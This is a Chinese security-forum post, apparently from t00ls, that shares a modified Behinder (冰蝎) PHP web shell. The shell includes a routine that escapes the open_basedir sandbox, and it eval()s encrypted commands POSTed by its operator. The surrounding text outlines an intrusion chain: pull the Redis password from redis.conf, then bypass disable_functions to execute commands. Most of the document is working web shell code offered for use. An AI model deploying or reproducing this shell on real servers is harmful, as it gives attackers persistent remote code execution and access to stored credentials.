## 冰蝎 bypass open_basedir 的马

### 作者：https://www.t00ls.net/space.php?uid=7785

## 内容

今天看了下：https://www.t00ls.net/thread-56298-1-1.html
突然想到为什么不在把 bypass open_basedir 加到马里呢。。。
然后。就把冰蝎的马加了一个bypass。。。马还是原马。
测试了一下是ok的。。。

要是服务器上有redis 直接 /www/server/redis/redis.conf 搜索 requirepass 找密码

然后 用 https://www.t00ls.net/thread-56217-1-1.html bypass disable_functions 执行命令。

然后一条龙。。。嘿嘿嘿。

```php
<?php
@error_reporting(0);
session_start();

function bypass_open_basedir(){
        if(!file_exists('bypass_open_basedir')){
                mkdir('bypass_open_basedir');
        }
        chdir('bypass_open_basedir');
        @ini_set('open_basedir','..');
        @$_Ei34Ww_sQDfq_FILENAME = dirname($_SERVER['SCRIPT_FILENAME']);
        @$_Ei34Ww_sQDfq_path = str_replace("\\",'/',$_Ei34Ww_sQDfq_FILENAME);
        @$_Ei34Ww_sQDfq_num = substr_count($_Ei34Ww_sQDfq_path,'/') + 1;
        $_Ei34Ww_sQDfq_i = 0;
        while($_Ei34Ww_sQDfq_i < $_Ei34Ww_sQDfq_num){
                @chdir('..');
                $_Ei34Ww_sQDfq_i++;
        }
        @ini_set('open_basedir','/');
        @rmdir($_Ei34Ww_sQDfq_FILENAME.'/'.'bypass_open_basedir');
}
bypass_open_basedir();

if (isset($_GET['pass']))
{
    $key=substr(md5(uniqid(rand())),16);
    $_SESSION['k']=$key;
    print $key;
}
else if (!empty($_SESSION['k']))
{
    $key=$_SESSION['k'];
        $post=file_get_contents("php://input").'';
        if(!extension_loaded('openssl'))
        {
                $t="base64_"."decode";
                $post=$t($post."");
                
                for($i=0;$i<strlen($post);$i++) {
                             $post[$i] = $post[$i]^$key[$i+1&15]; 
                            }
        }
        else
        {
                $post=openssl_decrypt($post, "AES128", $key);
        }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
    @eval($params);
}
?>

```

### 原帖：https://www.t00ls.net/thread-56301-1-1.html 

### 参考：https://www.t00ls.net/thread-56337-1-1.html

### 欢迎大家前往土司投稿！